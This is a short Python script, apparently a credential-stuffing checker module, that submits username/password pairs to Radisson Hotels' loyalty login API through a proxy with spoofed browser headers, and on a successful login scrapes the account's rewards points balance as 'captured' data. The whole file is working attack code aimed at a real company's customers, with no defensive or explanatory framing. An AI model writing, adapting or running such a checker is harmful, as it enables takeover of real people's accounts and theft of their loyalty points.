import requests
import time
import json

def tryLogin(data, proxy):
	username, password = data

	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
	    'Accept': 'text/plain, */*; q=0.01',
	    'Accept-Language': 'en-US',
	    'Content-Type': 'application/json;charset=UTF-8',
	    'X-Requested-With': 'XMLHttpRequest',
	    'DNT': '1',
	    'Connection': 'keep-alive',
	    'Referer': 'https://www.radissonhotels.com/en-us/',
	    'TE': 'Trailers',
	    'X-Requested-With': 'XMLHttpRequest',
	}
	postdata = {"user":username,"password":password,"rememberMe":"false"}
	s = requests.session()
	
	loginResp = s.post("https://www.radissonhotels.com/loyalty-api/authentication", timeout=5, headers=headers, proxies=proxy, data=json.dumps(postdata))

	try:
		loginResp.headers['Authorization']
		try:
			profiledata = s.get("https://www.radissonhotels.com/en-us/radisson-rewards/secure/my-account", headers=headers, proxies=proxy, timeout=10).text
			points = profiledata.split('number-points')[1].split('>')[1].split('</')[0].strip()
			capturedata = "{} points".format(points)
			return (True, capturedata)
		except:
			return (True, "")
	except:
		return (False,)